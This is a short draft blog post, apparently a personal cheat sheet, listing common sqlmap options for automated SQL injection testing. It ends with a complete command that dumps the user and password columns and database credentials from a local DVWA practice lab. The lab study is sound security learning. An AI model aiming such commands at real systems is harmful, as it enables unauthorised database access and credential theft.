---
title: "Sqlmap"
date: 2020-04-08
description: "汇总使用 sqlmap 自动化进行 SQL 注入测试时的常用命令行选项,以及针对 DVWA 漏洞环境的完整脱库命令示例。"
tags: ["安全"]
draft: true
cover:
  image: "images/covers/20200408-Sqlmap-rqo.svg"
  alt: ""
  hidden: false
aliases: ["/posts/2020040805h9rh/"]
---

```
-u # URL

--cookie="k:v;k:v" # set Cookie

--batch # no interaction(交互)

--dbs # show databases

--tables # show tables

-T # Table

--columns # show columns

-C # column

--dump

sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=na1gq5d41pp1hccflp3ornehm3" --users --passwords -D dvwa -T users -C "user,password" --dump  --batch

```
